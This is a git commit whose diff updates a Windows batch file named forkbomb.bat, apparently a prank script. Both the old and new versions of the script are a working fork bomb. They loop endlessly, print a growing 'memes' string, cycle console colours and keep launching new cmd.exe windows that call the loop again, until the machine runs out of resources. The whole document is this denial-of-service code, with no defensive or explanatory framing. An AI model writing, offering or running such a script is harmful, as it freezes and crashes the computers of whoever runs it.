98fdc63db2eb9852be100aecbee36361149bc703
I2obiN <thomashood10@yahoo.com>
2016-10-10 01:14:45 +0100

    Update forkbomb.bat

--- forkbomb.bat
+++ forkbomb.bat
@@ -1,6 +1,9 @@
+@echo off 
 :b 
-@SET m=%m% memes
-@SET /A c=c+1
-@echo %m% 
-@start /I cmd.exe /T:0%c% /K call b
-@goto b     
+SET m=%m%memes 
+SET /A c=c+1 
+IF [%c%]==[10] SET /A c=0 
+COLOR 0%c% 
+echo %m%
+start /I cmd.exe /T:0%c% /K call b 
+goto:b
